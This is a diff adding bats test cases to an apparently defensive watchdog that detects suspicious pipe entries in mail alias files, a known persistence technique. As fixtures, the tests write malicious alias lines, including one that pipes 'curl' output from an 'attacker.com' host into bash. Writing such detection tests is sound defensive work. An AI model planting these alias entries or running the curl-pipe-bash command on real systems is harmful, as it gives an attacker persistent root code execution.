@@ -230,3 +230,56 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-aliases -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): aliases-watchdog does NOT refresh baseline on suspicious-pipe detection — alert STAYS until operator updates" {
+    # T1546.004 mail-delivery-triggered root-exec persistence — alert
+    # MUST persist across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf 'evil: |/tmp/.x\n' > "${ALIASES}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"aliases_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented suspicious pipe NOT flagged: # prefix filtered)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'mailman: |/usr/lib/mailman/mail/mailman post mailman\nstaff: :include:/etc/mail/staff-list\npostmaster: root\n# evil: |/tmp/.example-attacker\n' > "${ALIASES}"
+    run_wd
+    ! cap | grep -q '"event":"aliases_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-file scan: /etc/aliases + /etc/mail/aliases axes — suspicious in EITHER → alert)" {
+    ALIASES2="${TMP}/mail-aliases"
+    seed_benign
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_ALIASES_PROFILE="report" \
+    SELFDEF_ALIASES_BASELINE="${BASELINE}" \
+    SELFDEF_ALIASES_FILES="${ALIASES} ${ALIASES2}" \
+    bash "${WD}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'evil: |/tmp/.evil\n' > "${ALIASES2}"
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_ALIASES_PROFILE="report" \
+    SELFDEF_ALIASES_BASELINE="${BASELINE}" \
+    SELFDEF_ALIASES_FILES="${ALIASES} ${ALIASES2}" \
+    bash "${WD}"
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in pipe)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'evil: |curl -s http://attacker.com/p | bash\n' > "${ALIASES}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
